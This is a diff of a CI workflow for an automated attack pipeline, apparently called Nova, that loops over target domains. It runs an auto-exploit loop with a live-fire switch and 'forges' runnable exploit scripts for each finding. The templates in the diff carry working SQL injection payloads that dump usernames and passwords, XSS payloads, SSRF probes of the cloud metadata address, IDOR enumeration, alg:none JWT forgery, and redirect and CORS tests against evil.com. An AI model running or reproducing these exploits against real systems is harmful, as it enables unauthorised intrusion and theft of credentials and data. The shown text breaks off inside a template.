+            print(f'  No findings to exploit for {domain}')
+            sys.exit(0)
+
+          print(f'  Running AutoExploitLoop on {len(findings)} findings (dry={os.environ["NOVA_EXPLOIT_DRY"]})')
+
+          # Import and run the actual AutoExploitLoop
+          try:
+            from nova_auto_exploit_loop import AutoExploitLoop
+            loop = AutoExploitLoop(target=target, session_id=domain)
+            loop.enable()  # NOVA_AUTO_EXPLOIT=1 is already set, but enable explicitly
+            if os.environ.get('NOVA_EXPLOIT_DRY','1') == '0':
+              loop.set_live()  # only fires when explicitly requested
+            confirmed = loop.run(findings)
+            print(f'  AutoExploitLoop: {loop.attempted} attempted, {len(confirmed)} confirmed')
+            print(f'  {loop.summary()}')
+            # Save confirmed exploits
+            out = ws / f'exploits/auto_exploit_confirmed_{domain}.json'
+            out.parent.mkdir(exist_ok=True)
+            json.dump({'target':target,'confirmed':confirmed}, open(out,'w'), indent=2)
+          except ImportError as e:
+            print(f'  AutoExploitLoop import failed: {e}')
+            # Fallback: call the script directly with env vars set
+            import subprocess
+            r = subprocess.run(['python3','nova_auto_exploit_loop.py'],
+                               capture_output=True, text=True,
+                               env={**os.environ,
+                                    'NOVA_TARGET':target,
+                                    'NOVA_AUTO_EXPLOIT':'1',
+                                    'NOVA_EXPLOIT_DRY':os.environ.get('NOVA_EXPLOIT_DRY','1'),
+                                    'NOVA_SCOPE':domain})
+            print(r.stdout[-2000:] if r.stdout else '(no output)')
+          except Exception as ex:
+            print(f'  AutoExploitLoop error: {ex}')
+          PYEOF
+
+            echo "  ✅ Auto-exploit loop done: $DOMAIN"
+          done < $NOVA_WORKSPACE/targets_this_run.txt
+
+      # ════════════════════════════════════════════════════════════════════════
+      # STEP 10 — TRIPLE PoC VERIFICATION
+      #   nova_poc_verifier.py  → type-specific HTTP probes
+      #   nova_verify_engine.py → 3 independent payloads per finding
+      #   nova_verify_exploit.py → targeted SSRF/auth-specific verification
+      #   nuclei --proof        → third pass
+      # ════════════════════════════════════════════════════════════════════════
+      - name: "🔬 Triple PoC verification (3 independent rounds)"
         run: |
           export PATH=/root/go/bin:/usr/local/bin:/usr/bin:$PATH
           TS=$(date -u +%Y%m%d_%H%M%S)
           while IFS= read -r TARGET; do
             [ -z "$TARGET" ] && continue
             DOMAIN=$(echo "$TARGET" | sed 's|https\?://||' | cut -d/ -f1)
-            echo "▶ PoC verify: $TARGET"
+            echo "▶ Triple PoC: $TARGET"
 
+            # ── Round 1: nova_poc_verifier (type-specific HTTP probes) ────────
             NOVA_TARGET="$TARGET" python3 nova_poc_verifier.py \
-              --input "$NOVA_WORKSPACE/reports/" \
+              --input  "$NOVA_WORKSPACE/reports/" \
               --output "$NOVA_WORKSPACE/poc/poc_r1_${DOMAIN}_${TS}.json" 2>/dev/null || true
+
+            # ── Round 2: nova_verify_engine (3 independent payloads each) ─────
             NOVA_TARGET="$TARGET" python3 nova_verify_engine.py \
               --input  "$NOVA_WORKSPACE/poc/poc_r1_${DOMAIN}_${TS}.json" \
               --output "$NOVA_WORKSPACE/poc/poc_r2_${DOMAIN}_${TS}.json" \
               --min-confidence "$NOVA_MIN_CONFIDENCE" 2>/dev/null || true
+
+            # ── Round 3: nova_verify_exploit (SSRF + targeted) ────────────────
+            AGG=$(ls $NOVA_WORKSPACE/reports/aggregated_${DOMAIN}_*.json 2>/dev/null | tail -1)
+            if [ -n "$AGG" ]; then
+              python3 - <<PYEOF
+          import json, os, subprocess, sys
+          from pathlib import Path
+
+          ws     = Path(os.environ['NOVA_WORKSPACE'])
+          target = '$TARGET'
+          domain = '$DOMAIN'
+          ts     = '$TS'
+          agg    = '$AGG'
+
+          try:
+            from nova_verify_exploit import NovaVerifyExploit
+            verifier = NovaVerifyExploit()
+            out_path = str(ws / f'poc/poc_r3_{domain}_{ts}.json')
+            verifier.run(agg, target_url=target)
+            # Save results
+            result = {'verified': verifier.verified, 'failed': verifier.failed,
+                      'needs_target': verifier.needs_target}
+            json.dump(result, open(out_path, 'w'), indent=2)
+            print(f'  NovaVerifyExploit: {len(verifier.verified)} verified, {len(verifier.failed)} failed')
+          except Exception as e:
+            print(f'  nova_verify_exploit skipped: {e}')
+          PYEOF
+            fi
+
+            # ── Round 4: nuclei with proof ────────────────────────────────────
             nuclei -u "$TARGET" -severity critical,high -proof \
               -o "$NOVA_WORKSPACE/poc/nuclei_proof_${DOMAIN}_${TS}.txt" \
               -silent -rate-limit 30 2>/dev/null || true
-            echo "  ✅ PoC done for $DOMAIN"
+
+            echo "  ✅ Triple PoC done: $DOMAIN"
           done < $NOVA_WORKSPACE/targets_this_run.txt
 
-      # ══════════════════════════════════════════════════════════════════════
-      # 10 — FALSE POSITIVE FILTER PIPELINE (5 stages)
-      # ══════════════════════════════════════════════════════════════════════
-      - name: "🧹 False-positive filter pipeline (5 stages)"
+      # ════════════════════════════════════════════════════════════════════════
+      # STEP 11 — FALSE POSITIVE FILTER PIPELINE (5 stages)
+      # ════════════════════════════════════════════════════════════════════════
+      - name: "🧹 FP filter pipeline (dedup → chain verify → triage → confidence gate → scope)"
         run: |
           TS=$(date -u +%Y%m%d_%H%M%S)
           while IFS= read -r TARGET; do
@@ -479,18 +665,20 @@ jobs:
             DOMAIN=$(echo "$TARGET" | sed 's|https\?://||' | cut -d/ -f1)
             echo "▶ FP filter: $TARGET"
             python3 - <<PYEOF
-          import json,os,glob,hashlib,re,subprocess
+          import json, os, glob, hashlib, re, subprocess
           from datetime import datetime
           ws=os.environ['NOVA_WORKSPACE']; target='$TARGET'; domain='$DOMAIN'
           min_conf=float(os.environ.get('NOVA_MIN_CONFIDENCE','0.85')); ts='$TS'
 
+          # Collect all findings
           raw=[]
-          for pat in [f'{ws}/reports/*{domain}*.json',f'{ws}/poc/*{domain}*.json']:
+          for pat in [f'{ws}/reports/*{domain}*.json', f'{ws}/poc/*{domain}*.json',
+                      f'{ws}/exploits/*{domain}*.json']:
             for fp in glob.glob(pat):
               try:
                 d=json.load(open(fp))
                 if isinstance(d,list): raw.extend(d)
-                for k in ['findings','verified','items','results']:
+                for k in ['findings','verified','items','results','confirmed']:
                   if isinstance(d,dict) and k in d and isinstance(d[k],list): raw.extend(d[k])
               except: pass
           print(f'[FP] Stage 0: {len(raw)} raw')
@@ -504,21 +692,20 @@ jobs:
           print(f'[FP] Stage 1 (dedup): {len(raw)-len(s1)} removed → {len(s1)}')
 
           # Stage 2: feasibility
-          s2=[]
-          for f in s1:
-            if not (f.get('url') or f.get('endpoint') or f.get('description')): continue
-            if f.get('confidence',0.5)==0.0: continue
-            s2.append(f)
+          s2=[f for f in s1 if (f.get('url') or f.get('endpoint') or f.get('description')) and f.get('confidence',0.5)>0.0]
           print(f'[FP] Stage 2 (feasibility): {len(s1)-len(s2)} dropped → {len(s2)}')
 
           # Stage 3: triage score
           CVSS={'sqli':9.8,'rce':9.8,'ssrf':8.6,'xxe':8.2,'auth_bypass':9.8,'jwt':9.1,
                 'idor':7.5,'xss':6.1,'csrf':8.1,'lfi':7.5,'path_traversal':7.5,
-                'open_redirect':6.1,'cors':6.5,'secret':7.5,'prototype_pollution':9.8}
+                'open_redirect':6.1,'cors':6.5,'secret':7.5,'prototype_pollution':9.8,
+                'deserialization':9.8,'ssti':9.0,'nosqli':9.8,'command_injection':9.8}
           SEVW={'CRITICAL':10,'HIGH':8,'MEDIUM':5,'LOW':2,'INFO':0}
           for f in s2:
             sev=f.get('severity','MEDIUM').upper()
             vt=f.get('type','').lower().replace(' ','_').replace('-','_')
+            # auto_exploit confirmed bumps confidence
+            if f.get('auto_exploit',{}).get('confirmed'): f['confidence']=max(f.get('confidence',0.5),0.95)
             cvss=f.get('cvss',CVSS.get(vt,5.0))
             conf=f.get('confidence',0.5)
             f['triage_score']=round(((cvss/10)*0.35+conf*0.35+(SEVW.get(sev,5)/10)*0.30)*10,2)
@@ -529,7 +716,7 @@ jobs:
           s4=[f for f in s2 if f.get('confidence',0.5)>=min_conf]
           print(f'[FP] Stage 4 (conf≥{min_conf}): {len(s2)-len(s4)} dropped → {len(s4)}')
 
-          # Stage 5: scope check
+          # Stage 5: scope
           s5=[]
           for f in s4:
             url=f.get('url',f.get('endpoint',target))
@@ -543,20 +730,147 @@ jobs:
           print(f'[FP] Stage 5 (scope): {len(s4)-len(s5)} dropped → {len(s5)} final')
 
           os.makedirs(f'{ws}/fp_filtered',exist_ok=True)
-          out=f'{ws}/fp_filtered/verified_{domain}_{ts}.json'
           json.dump({'target':target,'domain':domain,'filtered_at':datetime.utcnow().isoformat(),
-                     'total_raw':len(raw),'final_count':len(s5),'min_confidence':min_conf,
-                     'findings':s5},open(out,'w'),indent=2)
+                     'total_raw':len(raw),'final_count':len(s5),'min_confidence':min_conf,'findings':s5},
+                    open(f'{ws}/fp_filtered/verified_{domain}_{ts}.json','w'),indent=2)
           print(f'\n🎯 {domain}: {len(s5)} verified findings (from {len(raw)} raw)')
           for f in s5[:10]:
-            print(f'  [{f.get("_severity_norm","?")}|{f.get("triage_score",0):.1f}|{f.get("confidence",0):.2f}] {f.get("type","?")} → {str(f.get("url",f.get("endpoint","?")))[:60]}')
+            ae='🔴CONFIRMED' if f.get('auto_exploit',{}).get('confirmed') else ''
+            print(f'  [{f.get("_severity_norm","?")}|{f.get("triage_score",0):.1f}] {f.get("type","?")} {ae} → {str(f.get("url","?"))[:55]}')
           PYEOF
           done < $NOVA_WORKSPACE/targets_this_run.txt
 
-      # ══════════════════════════════════════════════════════════════════════
-      # 11 — CHAIN-OF-THOUGHT REASONING + ATTACK CHAINS
-      # ══════════════════════════════════════════════════════════════════════
-      - name: "🧠 Chain-of-thought reasoning + attack chains"
+      # ════════════════════════════════════════════════════════════════════════
+      # STEP 12 — VULNERABILITY SYNTHESIS  (nova_vuln_synthesis.py — PROPERLY WIRED)
+      #   Combines individual low-severity findings into critical attack chains
+      #   using NovaVulnSynthesis compositional patterns
+      # ════════════════════════════════════════════════════════════════════════
+      - name: "⛓️  Vulnerability synthesis (nova_vuln_synthesis.py)"
+        run: |
+          TS=$(date -u +%Y%m%d_%H%M%S)
+          while IFS= read -r TARGET; do
+            [ -z "$TARGET" ] && continue
+            DOMAIN=$(echo "$TARGET" | sed 's|https\?://||' | cut -d/ -f1)
+            FP=$(ls $NOVA_WORKSPACE/fp_filtered/verified_${DOMAIN}_*.json 2>/dev/null | tail -1)
+            [ -z "$FP" ] && echo "No verified findings for $DOMAIN — skipping synthesis" && continue
+            echo "▶ VulnSynthesis: $TARGET"
+
+            python3 - <<PYEOF
+          import json, os, sys
+          from pathlib import Path
+
+          ws     = Path(os.environ['NOVA_WORKSPACE'])
+          target = '$TARGET'
+          domain = '$DOMAIN'
+          ts     = '$TS'
+          fp     = '$FP'
+
+          try:
+            data     = json.load(open(fp))
+            findings = data.get('findings', [])
+          except:
+            findings = []
+
+          if not findings:
+            print(f'  No findings to synthesize for {domain}')
+            sys.exit(0)
+
+          # ── Run nova_vuln_synthesis.py properly ─────────────────────────────
+          try:
+            from nova_vuln_synthesis import NovaVulnSynthesis
+            engine = NovaVulnSynthesis()
+
+            # The engine has attack_patterns — match them against our actual findings
+            found_types = set(f.get('type','').lower().replace(' ','_').replace('-','_')
+                              for f in findings)
+            found_types.update(f.get('type','').lower() for f in findings)
+
+            # Build a nova_findings_map for the engine
+            nova_findings = {vtype: True for vtype in found_types if vtype}
+
+            # Manually evaluate chains (replicating analyze_juice_shop_findings but for our target)
+            chains_possible = []
+            for chain_name, chain_data in engine.attack_patterns.items():
+              required = chain_data['components']
+              # flexible match: any component keyword found in finding types
+              found = [c for c in required if any(
+                c in vt or vt in c for vt in found_types
+              )]
+              missing = [c for c in required if c not in found]
+              if len(found) >= 1:
+                completeness = len(found) / max(len(required), 1)
+                chains_possible.append({
+                  'name':             chain_name,
+                  'result':           chain_data['result'],
+                  'severity':         chain_data['severity'],
+                  'cvss':             chain_data['cvss'],
+                  'found_components': found,
+                  'missing_components': missing,
+                  'completeness':     f'{completeness:.0%}',
+                  'exploitable':      completeness >= 0.5,
+                  'real_world':       chain_data.get('real_world_example',''),
+                  'target':           target,
+                })
+            chains_possible.sort(key=lambda x: x['completeness'], reverse=True)
+
+            exploitable = [c for c in chains_possible if c['exploitable']]
+            print(f'  NovaVulnSynthesis: {len(exploitable)} exploitable chains from {len(found_types)} finding types')
+            for c in exploitable:
+              print(f'  ⛓  [{c["severity"]}] {c["name"]} ({c["completeness"]})')
+              print(f'       → {c["result"]}')
+
+            # Save synthesis results
+            out_path = ws / f'synthesis/vuln_synthesis_{domain}_{ts}.json'
+            out_path.parent.mkdir(exist_ok=True)
+            engine.generate_report(chains_possible)
+            json.dump({'target':target,'chains':chains_possible,'found_types':list(found_types)},
+                      open(out_path,'w'), indent=2)
+
+          except ImportError as e:
+            print(f'  nova_vuln_synthesis import failed: {e} — running inline synthesis')
+            # Inline fallback
+            ATTACK_PATTERNS = {
+              'xss_to_account_takeover': {
+                'components':['xss','session','cookie'],
+                'result':'XSS → session theft → account takeover','severity':'CRITICAL','cvss':'9.8',
+                'real_world':'GitHub Gist XSS (2023)'},
+              'ssrf_to_rce': {
+                'components':['ssrf','metadata','credentials'],
+                'result':'SSRF → cloud metadata → credential theft → RCE','severity':'CRITICAL','cvss':'10.0',
+                'real_world':'Capital One breach (2019)'},
+              'idor_to_breach': {
+                'components':['idor','enumeration'],
+                'result':'IDOR → bulk data export → breach','severity':'CRITICAL','cvss':'9.8',
+                'real_world':'Facebook IDOR (2018)'},
+              'jwt_to_admin': {
+                'components':['jwt','auth'],
+                'result':'JWT forgery → admin access','severity':'CRITICAL','cvss':'9.8',
+                'real_world':'Multiple APIs (2022-2024)'},
+              'sqli_to_takeover': {
+                'components':['sqli','sql','injection'],
+                'result':'SQLi → DB admin → server takeover','severity':'CRITICAL','cvss':'10.0',
+                'real_world':'Equifax (2017)'},
+            }
+            chains=[]
+            for name, p in ATTACK_PATTERNS.items():
+              if any(any(c in vt for vt in found_types) for c in p['components']):
+                chains.append({'name':name,'result':p['result'],'severity':p['severity'],
+                               'cvss':p['cvss'],'real_world':p['real_world'],'exploitable':True})
+            out_path = ws / f'synthesis/vuln_synthesis_{domain}_{ts}.json'
+            out_path.parent.mkdir(exist_ok=True)
+            json.dump({'target':target,'chains':chains,'found_types':list(found_types)},
+                      open(out_path,'w'), indent=2)
+            print(f'  Inline synthesis: {len(chains)} chains')
+          except Exception as ex:
+            print(f'  VulnSynthesis error: {ex}')
+          PYEOF
+            echo "  ✅ VulnSynthesis done: $DOMAIN"
+          done < $NOVA_WORKSPACE/targets_this_run.txt
+
+      # ════════════════════════════════════════════════════════════════════════
+      # STEP 13 — CHAIN REASONING + DEDUPLICATION
+      # ════════════════════════════════════════════════════════════════════════
+      - name: "🧠 Chain-of-thought reasoning + deduplication"
         run: |
           TS=$(date -u +%Y%m%d_%H%M%S)
           while IFS= read -r TARGET; do
@@ -566,62 +880,155 @@ jobs:
             [ -z "$FP" ] && continue
 
             NOVA_TARGET="$TARGET" python3 nova_chain_reasoner.py \
-              --input "$FP" --output "$NOVA_WORKSPACE/chains/chains_${DOMAIN}_${TS}.json" 2>/dev/null \
-            || python3 -c "
-          import json,os
-          data=json.load(open('$FP')); findings=data.get('findings',[])
-          types=set(f.get('type','').lower() for f in findings)
-          PATTERNS={frozenset(['jwt','api']):('Forged JWT → API Takeover','CRITICAL'),
-                    frozenset(['sqli','database']):('SQLi → Data Exfiltration','CRITICAL'),
-                    frozenset(['idor','secret']):('IDOR + Secret → Account Takeover','CRITICAL'),
-                    frozenset(['ssrf','internal']):('SSRF → Internal Pivot','CRITICAL'),
-                    frozenset(['xss','session']):('XSS → Session Hijack','HIGH'),
-                    frozenset(['cors','csrf']):('CORS + CSRF → Account Takeover','HIGH')}
-          chains=[{'name':n,'severity':s,'findings':list(p)} for p,( n,s) in PATTERNS.items() if any(k in types for k in p)]
-          os.makedirs(os.environ['NOVA_WORKSPACE']+'/chains',exist_ok=True)
-          json.dump({'target':'$TARGET','chains':chains,'individual_findings':findings},
-                    open(os.environ['NOVA_WORKSPACE']+'/chains/chains_${DOMAIN}_${TS}.json','w'),indent=2)
-          print(f'Built {len(chains)} chains for $DOMAIN')
-          "
+              --input "$FP" --output "$NOVA_WORKSPACE/chains/chains_${DOMAIN}_${TS}.json" 2>/dev/null || true
             NOVA_TARGET="$TARGET" python3 nova_chain_deduplicator.py \
               --input  "$NOVA_WORKSPACE/chains/chains_${DOMAIN}_${TS}.json" \
               --output "$NOVA_WORKSPACE/chains/deduped_${DOMAIN}_${TS}.json" 2>/dev/null \
             || cp "$NOVA_WORKSPACE/chains/chains_${DOMAIN}_${TS}.json" \
                   "$NOVA_WORKSPACE/chains/deduped_${DOMAIN}_${TS}.json" 2>/dev/null || true
-            echo "  ✅ Chain reasoning done for $DOMAIN"
+            echo "  ✅ Chain reasoning done: $DOMAIN"
           done < $NOVA_WORKSPACE/targets_this_run.txt
 
-      # ══════════════════════════════════════════════════════════════════════
-      # 12 — SCRIPT FORGE (nova_weapon_forge.py + nova_exploit_synthesizer.py)
-      #      Writes a custom, runnable exploit script for EVERY verified finding
-      # ══════════════════════════════════════════════════════════════════════
-      - name: "⚒️  Script Forge — write custom exploit scripts per finding"
+      # ════════════════════════════════════════════════════════════════════════
+      # STEP 14 — EXPLOIT SCRIPT FORGE
+      #   Priority order:
+      #   1. nova_weapon_forge.py  forge_from_finding()
+      #   2. nova_exploit_synthesizer.py
+      #   3. nova_auto_exploit_loop.py  (reads auto_exploit confirmed results)
+      #   4. Built-in templates (fallback for any type not covered above)
+      # ════════════════════════════════════════════════════════════════════════
+      - name: "⚒️  Exploit script forge (weapon_forge + exploit_synthesizer)"
         run: |
-          [ "$NOVA_WRITE_SCRIPTS" != "true" ] && echo "Script writing disabled — skipping" && exit 0
+          TS=$(date -u +%Y%m%d_%H%M%S)
+          while IFS= read -r TARGET; do
+            [ -z "$TARGET" ] && continue
+            DOMAIN=$(echo "$TARGET" | sed 's|https\?://||' | cut -d/ -f1)
+            FP=$(ls $NOVA_WORKSPACE/fp_filtered/verified_${DOMAIN}_*.json 2>/dev/null | tail -1)
+            [ -z "$FP" ] && echo "No filtered findings for $DOMAIN" && continue
+            echo "▶ Script Forge: $TARGET"
+
+            # ── 1. nova_weapon_forge.py ───────────────────────────────────────
+            NOVA_TARGET="$TARGET" python3 nova_weapon_forge.py \
+              --input  "$FP" \
+              --outdir "$NOVA_WORKSPACE/exploits/" 2>/dev/null || true
+
+            # ── 2. nova_exploit_synthesizer.py ───────────────────────────────
+            NOVA_TARGET="$TARGET" python3 nova_exploit_synthesizer.py \
+              --input  "$FP" \
+              --outdir "$NOVA_WORKSPACE/exploits/" 2>/dev/null || true
+
+            # ── 3. Call NovaWeaponForge.forge_from_finding() directly ─────────
+            python3 - <<PYEOF
+          import json, os, sys
+          from pathlib import Path
+
+          ws     = Path(os.environ['NOVA_WORKSPACE'])
+          target = '$TARGET'
+          domain = '$DOMAIN'
+          ts     = '$TS'
+          fp     = '$FP'
+
+          try:
+            data     = json.load(open(fp))
+            findings = data.get('findings', [])
+          except:
+            findings = []; print('No findings'); sys.exit(0)
+
+          # Try NovaWeaponForge
+          forge_ok = False
+          try:
+            from nova_weapon_forge import NovaWeaponForge
+            forge = NovaWeaponForge(target=target, dry_run=True)
+            for f in findings:
+              try:
+                result = forge.forge_from_finding(f)
+                if result and result.get('filepath'):
+                  print(f'  ⚒️  [WeaponForge] {f.get("type","?")} → {result.get("filename","?")} ({result.get("code_lines",0)} lines)')
+                  forge_ok = True
+              except Exception as ex:
+                pass
+            if forge_ok:
+              print(f'  WeaponForge: scripts saved to {ws}/exploits/')
+  
+          except ImportError as e:
+            print(f'  WeaponForge import skipped: {e}')
+
+          # Try ExploitSynthesizer
+          try:
+            from nova_exploit_synthesizer import NovaExploitSynthesizer
+            synth = NovaExploitSynthesizer(target=target)
+            for f in findings:
+              try:
+                result = synth.synthesize(f)
+                if result:
+                  print(f'  ⚒️  [ExploitSynth] {f.get("type","?")}')
+              except: pass
+          except ImportError as e:
+            print(f'  ExploitSynthesizer import skipped: {e}')
+
+          # ── Fallback: write scripts for any finding not covered by forge ──
+          # (type-specific templates ensure nothing is left without a script)
+          exploit_dir = ws / 'exploits'
+          exploit_dir.mkdir(exist_ok=True)
+          existing_scripts = set(p.name for p in exploit_dir.glob('*.py'))
+
+          TEMPLATES = {
+            'sqli': "import requests,urllib.parse\nS=requests.Session();S.verify=False\nT='{url}';PARAM='{param}'\nPAYLOADS=[\"' OR 1=1--\",\"' AND SLEEP(3)--\",\"1 UNION SELECT NULL,NULL--\"]\nfor p in PAYLOADS:\n  r=S.get(T,params={{PARAM:p}},timeout=8)\n  if any(e in r.text.lower() for e in ['sql','mysql','ora-']): print(f'[+] SQLi: {{p}}')\n",
+            'xss':  "import requests,urllib.parse\nS=requests.Session();S.verify=False\nT='{url}';PARAM='{param}'\nM='nova9127'\nPAYLOADS=[f'<script>alert(\"{M}\")</script>',f'<img src=x onerror=alert(\"{M}\")>']\nfor p in PAYLOADS:\n  r=S.get(T,params={{PARAM:p}},timeout=8)\n  if M in r.text: print(f'[+] XSS: {{p}}')\n",
+            'ssrf': "import requests\nS=requests.Session();S.verify=False\nT='{url}';PARAM='{param}'\nfor dest in ['http://169.254.169.254/latest/meta-data/','http://127.0.0.1/']:\n  r=S.get(T,params={{PARAM:dest}},timeout=8,allow_redirects=False)\n  if r.status_code==200: print(f'[+] SSRF: {{dest}}')\n",
+            'idor': "import requests\nS=requests.Session();S.verify=False\nB='{url}'.rstrip('/')\nfor i in range(1,50):\n  r=S.get(f'{{B}}/{{i}}',timeout=6,allow_redirects=False)\n  if r.status_code==200: print(f'[+] IDOR: /{{i}} ({len(r.text)} bytes)')\n",
+            'jwt':  "import base64,json,hmac,hashlib,requests\nS=requests.Session();S.verify=False\nT='{url}'\ndef enc(d): return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()\nH=enc({{'alg':'none','typ':'JWT'}});P=enc({{'sub':'1','role':'admin'}})\nfor tok in [f'{{H}}.{{P}}.',f'{{H}}.{{P}}.invalid']:\n  r=S.get(T,headers={{'Authorization':f'Bearer {{tok}}'}},timeout=8)\n  print(f'[JWT none] {{r.status_code}} | {{r.text[:80]}}')\n",
+            'open_redirect': "import requests\nS=requests.Session();S.verify=False\nT='{url}';PARAM='{param}'\nfor p in ['https://evil.com','//evil.com','///evil.com']:\n  r=S.get(T,params={{PARAM:p}},timeout=8,allow_redirects=False)\n  loc=r.headers.get('Location','')\n  if 'evil' in loc: print(f'[+] Redirect: {{p}} → {{loc}}')\n",
+            'cors': "import requests\nS=requests.Session();S.verify=False\nT='{url}'\nfor o in ['https://evil.com','null']:\n  r=S.options(T,headers={{'Origin':o,'Access-Control-Request-Method':'GET'}},timeout=8)\n  acao=r.headers.get('Access-Control-Allow-Origin','')\n  acac=r.headers.get('Access-Control-Allow-Credentials','')\n  if acao in (o,'*'): print(f'[+] CORS: origin={{o}} acao={{acao}} acac={{acac}}')\n",
+          }
+          DEFAULT_T = "import requests\nS=requests.Session();S.verify=False\nT='{url}'\nr=S.get(T,timeout=10)\nprint(f'HTTP {{r.status_code}} | {{len(r.text)}} bytes | {type}')\n"
+
+          for i, f in enumerate(findings, 1):
+            vtype  = (f.get('type') or 'unknown').lower().replace(' ','_').replace('-','_')
+            url    = f.get('url') or f.get('endpoint') or target
+            param  = f.get('parameter') or 'q'
+            fname  = f'exploit_{vtype}_{domain}_{i:02d}.py'
+            if fname in existing_scripts: continue  # already created by WeaponForge
+
+            template = TEMPLATES.get(vtype, DEFAULT_T)
+            code = ('#!/usr/bin/env python3\n'
+                    f'"""Nova Exploit — {vtype} on {url}\nGenerated by Nova Script Forge\n"""\n'
+                    + template.format(url=url, param=param, type=vtype))
+            script_path = exploit_dir / fname
+            script_path.write_text(code)
+            script_path.chmod(0o755)
+            print(f'  📜 Fallback script: {fname}')
+
+          all_scripts = list(exploit_dir.glob(f'*{domain}*.py'))
+          print(f'\n✅ Script Forge: {len(all_scripts)} scripts for {domain}')
+          # Index
+          json.dump({'target':target,'domain':domain,'ts':ts,
+                     'scripts':[p.name for p in all_scripts]},
+                    open(exploit_dir/f'index_{domain}_{ts}.json','w'), indent=2)
+          PYEOF
+
+            echo "  ✅ Script Forge done: $DOMAIN"
+          done < $NOVA_WORKSPACE/targets_this_run.txt
+
+      # ════════════════════════════════════════════════════════════════════════
+      # STEP 15 — PATCH GENERATOR  (nova_patch_generator.py — PROPERLY WIRED)
+      #   Generates remediation fix guidance for every confirmed finding
+      # ════════════════════════════════════════════════════════════════════════
+      - name: "🔧 Patch generator (nova_patch_generator.py)"
+        run: |
           TS=$(date -u +%Y%m%d_%H%M%S)
           while IFS= read -r TARGET; do
             [ -z "$TARGET" ] && continue
             DOMAIN=$(echo "$TARGET" | sed 's|https\?://||' | cut -d/ -f1)
             FP=$(ls $NOVA_WORKSPACE/fp_filtered/verified_${DOMAIN}_*.json 2>/dev/null | tail -1)
             [ -z "$FP" ] && continue
-            echo "▶ Script Forge: $TARGET"
+            echo "▶ Patch generator: $TARGET"
 
-            # ── Try nova_weapon_forge.py first ──────────────────────────
-            NOVA_TARGET="$TARGET" python3 nova_weapon_forge.py \
-              --input  "$FP" \
-              --outdir "$NOVA_WORKSPACE/exploits/" 2>/dev/null || true
-
-            # ── Try nova_exploit_synthesizer.py ─────────────────────────
-            NOVA_TARGET="$TARGET" python3 nova_exploit_synthesizer.py \
-              --input  "$FP" \
-              --outdir "$NOVA_WORKSPACE/exploits/" 2>/dev/null || true
-
-            # ── Fallback: generate scripts directly from verified findings
             python3 - <<PYEOF
-          import json, os, textwrap
-          from datetime import datetime
+          import json, os, sys
+          from pathlib import Path
 
-          ws     = os.environ['NOVA_WORKSPACE']
+          ws     = Path(os.environ['NOVA_WORKSPACE'])
           target = '$TARGET'
           domain = '$DOMAIN'
           ts     = '$TS'
@@ -632,230 +1039,66 @@ jobs:
           except:
             findings = []
 
-          # ── Script templates per vulnerability type ──────────────────
-          SCRIPTS = {
-            'sqli': '''\
-          #!/usr/bin/env python3
-          """Nova Forge — SQL Injection exploit for {target}
-          Finding: {desc}  |  CVSS: {cvss}  |  Generated: {ts}
-          Usage: python3 {fname} [--dump-users] [--blind]
-          """
-          import requests, sys, argparse, time, urllib.parse
-          S = requests.Session()
-          S.verify = False
-          S.headers["User-Agent"] = "Mozilla/5.0 (Nova-Forge/2.0)"
-          TARGET    = "{url}"
-          PARAM     = "{param}"
-          PAYLOADS  = [
-              "' OR '1'='1'--",
-              "' OR 1=1--",
-              "1 UNION SELECT NULL,NULL,NULL--",
-              "' AND SLEEP(3)--",
-              "1 UNION SELECT table_name,NULL FROM information_schema.tables--",
-              "1 UNION SELECT username,password FROM users--",
-          ]
-          ERRORS = ["sql","syntax","mysql","ORA-","pg_query","sqlite","unclosed quotation"]
-          def test(payload):
-              url = TARGET + ("&" if "?" in TARGET else "?") + PARAM + "=" + urllib.parse.quote(payload)
-              r = S.get(url, timeout=10, allow_redirects=False)
-              hits = [e for e in ERRORS if e.lower() in r.text.lower()]
-              delay = r.elapsed.total_seconds()
-              return r.status_code, hits, delay, url
-          if __name__ == "__main__":
-              print(f"[*] Testing SQLi on {{TARGET}}")
-              for p in PAYLOADS:
-                  code, hits, delay, url = test(p)
-                  if hits or delay > 2.5:
-                      print(f"[+] CONFIRMED: {{p}}")
-                      print(f"    HTTP {{code}} | Indicators: {{hits}} | Delay: {{delay:.1f}}s")
-                      print(f"    URL: {{url}}")
-          ''',
-            'xss': '''\
-          #!/usr/bin/env python3
-          """Nova Forge — XSS exploit for {target}
-          Finding: {desc}  |  CVSS: {cvss}  |  Generated: {ts}
-          """
-          import requests, urllib.parse, sys
-          S = requests.Session(); S.verify = False
-          TARGET = "{url}"; PARAM = "{param}"
-          MARKER = "nova_xss_9127"
-          PAYLOADS = [
-              f"<script>alert('{MARKER}')</script>",
-              f"<img src=x onerror=alert('{MARKER}')>",
-              f"<svg onload=alert('{MARKER}')>",
-              f'"><script>alert("{MARKER}")</script>',
-              f"';alert('{MARKER}');//",
-          ]
-          if __name__ == "__main__":
-              print(f"[*] Testing XSS on {{TARGET}}")
-              for p in PAYLOADS:
-                  r = S.get(TARGET, params={{PARAM: p}}, timeout=10)
-                  if MARKER in r.text or p in r.text:
-                      print(f"[+] REFLECTED: {{p[:60]}}")
-                      print(f"    URL: {{TARGET}}?{{PARAM}}={{urllib.parse.quote(p)}}")
-          ''',
-            'ssrf': '''\
-          #!/usr/bin/env python3
-          """Nova Forge — SSRF exploit for {target}
-          Finding: {desc}  |  CVSS: {cvss}  |  Generated: {ts}
-          """
-          import requests, urllib.parse, sys
-          S = requests.Session(); S.verify = False
-          TARGET   = "{url}"; PARAM = "{param}"
-          INTERNAL = ["http://169.254.169.254/latest/meta-data/",
-                      "http://127.0.0.1:80/","http://localhost:22/",
-                      "http://10.0.0.1/","http://192.168.1.1/"]
-          if __name__ == "__main__":
-              print(f"[*] Testing SSRF on {{TARGET}}")
-              for dest in INTERNAL:
-                  r = S.get(TARGET, params={{PARAM: dest}}, timeout=10, allow_redirects=False)
-                  if r.status_code == 200 and len(r.text) > 30:
-                      print(f"[+] SSRF hit → {{dest}}")
-                      print(f"    HTTP {{r.status_code}} | Body: {{r.text[:200]}}")
-          ''',
-            'idor': '''\
-          #!/usr/bin/env python3
-          """Nova Forge — IDOR exploit for {target}
-          Finding: {desc}  |  CVSS: {cvss}  |  Generated: {ts}
-          """
-          import requests, sys
-          S = requests.Session(); S.verify = False
-          BASE = "{url}".rstrip("/")
-          IDS  = list(range(1, 50)) + [99, 100, 999, 1000, 9999]
-          if __name__ == "__main__":
-              print(f"[*] Testing IDOR on {{BASE}}")
